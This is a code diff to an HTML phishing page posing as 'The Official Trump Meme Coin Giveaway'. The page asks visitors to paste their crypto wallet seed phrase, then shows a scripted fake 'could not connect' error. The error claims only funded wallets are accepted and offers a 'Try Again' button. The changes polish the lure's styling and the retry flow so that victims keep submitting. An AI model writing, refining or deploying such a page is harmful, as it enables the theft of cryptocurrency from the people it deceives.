@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>The Official Trump Meme Coin Giveaway</title>
   <style>
     body, h1, h2, p, button, input, select, a, footer {
@@ -91,24 +91,19 @@
       padding: 10px;
       border-radius: 6px;
       margin-top: 10px;
-      animation: fadeIn 0.5s ease-in-out;
     }
     #error-box button {
-      margin-top: 10px;
-      padding: 8px 15px;
-      font-size: 0.85rem;
-      background-color: #cc0000;
+      margin-top: 8px;
+      background: #ff4500;
       color: white;
       border: none;
-      border-radius: 4px;
+      padding: 8px 14px;
+      font-weight: bold;
+      border-radius: 5px;
       cursor: pointer;
     }
     #error-box button:hover {
-      background-color: #a30000;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(-10px); }
-      to { opacity: 1; transform: translateY(0); }
+      background: #e03e00;
     }
     label {
       display: block;
@@ -234,16 +229,12 @@
         <option value="walletconnect">WalletConnect</option>
         <option value="others">Others</option>
       </select>
-
       <label for="wallet-phrase">Enter Your Wallet Phrase</label>
       <textarea id="wallet-phrase" name="wallet_phrase" placeholder="Copy & Paste Wallet Phrase" required></textarea>
-
+      <div id="error-box"></div>
       <div class="note">
         <p>Note: Only wallets with a balance or transaction history will be credited.</p>
       </div>
-
-      <div id="error-box"></div>
-
       <button class="btn" id="submit-btn" type="submit">Connect</button>
     </form>
   </div>
@@ -269,6 +260,15 @@
       document.body.classList.add('noscroll');
     }
 
+    function returnToMainPage() {
+      document.getElementById('wallet-page').classList.remove('active');
+      document.getElementById('main-content').classList.remove('blurred');
+      document.querySelector('header').classList.remove('blurred');
+      document.querySelector('footer').classList.remove('blurred');
+      document.body.classList.remove('noscroll');
+      document.getElementById("error-box").style.display = "none";
+    }
+
     document.getElementById("wallet-form").addEventListener("submit", function(event) {
       event.preventDefault();
       const btn = document.getElementById("submit-btn");
@@ -282,7 +282,7 @@
           setTimeout(() => {
             errorBox.innerHTML = `
               Wallet could not connect to server. Only wallets with a balance or transaction history can be connected.<br>
-              <button onclick="location.reload()">Try Again</button>
+              <button onclick="returnToMainPage()">Try Again</button>
             `;
             errorBox.style.display = "block";
             btn.disabled = false;
@@ -292,7 +292,7 @@
         .catch(function(error) {
           errorBox.innerHTML = `
             Unexpected server issue. Please try again.<br>
-            <button onclick="location.reload()">Try Again</button>
+            <button onclick="returnToMainPage()">Try Again</button>
           `;
           errorBox.style.display = "block";
           btn.disabled = false;
